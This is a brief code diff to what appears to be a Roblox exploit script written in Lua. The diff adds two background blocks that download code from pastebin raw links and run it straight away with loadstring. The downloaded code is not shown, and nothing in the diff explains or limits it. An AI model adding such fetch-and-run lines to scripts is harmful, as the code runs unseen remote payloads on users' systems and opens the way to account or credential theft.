@@ -19,6 +19,14 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
     Icon = "rbxassetid://16590941074"
 })
 
+spawn(function() 
+    loadstring(game:HttpGet(('https://pastebin.com/raw/EgTd71aJ'),true))()
+end)
+
+spawn(function() 
+    loadstring(game:HttpGet(('https://pastebin.com/raw/ucCMDZcj'),true))()
+end)
+
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
